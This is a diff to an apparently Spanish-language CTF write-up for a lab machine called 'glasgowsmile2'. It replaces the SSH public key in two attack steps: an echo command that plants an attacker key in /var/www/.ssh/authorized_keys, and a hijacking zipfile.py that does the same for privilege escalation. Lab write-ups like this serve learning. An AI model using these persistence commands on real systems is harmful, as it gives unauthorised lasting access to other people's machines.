@@ -164,7 +164,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 <div><p>No encontramos nada asi que enviamos nuestra clave publica como autorizada para ssh</p></div>
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
-<code><span class="kd">$</span><span class="p"> echo "ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys" > /var/www/.ssh/authorized_keys</span>
+<code><span class="kd">$</span><span class="p"> echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBFB8VsBP7KYI/8zWbDliyvA6aoaSroJLRelWNPWJmE root@parrot" > /var/www/.ssh/authorized_keys</span>
 </code></pre></div></div>
 
 <div><p>Podemos probar traernos el puerto 8080 que veiamos filtered al conectarnos</p></div>
@@ -444,7 +444,7 @@ Am I good or not? ;)
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
 <code><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/opt/get_out</span><span class="p">$ cat zipfile.py
 import os
-os.system("mkdir ~/.ssh; echo 'ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys' > ~/.ssh/authorized_keys")
+os.system("mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBFB8VsBP7KYI/8zWbDliyvA6aoaSroJLRelWNPWJmE root@parrot' > ~/.ssh/authorized_keys")
 </span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/opt/get_out</span><span class="p">$ chmod +x zipfile.py
 </span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/opt/get_out</span><span class="p">$</span>
 </code></pre></div></div>
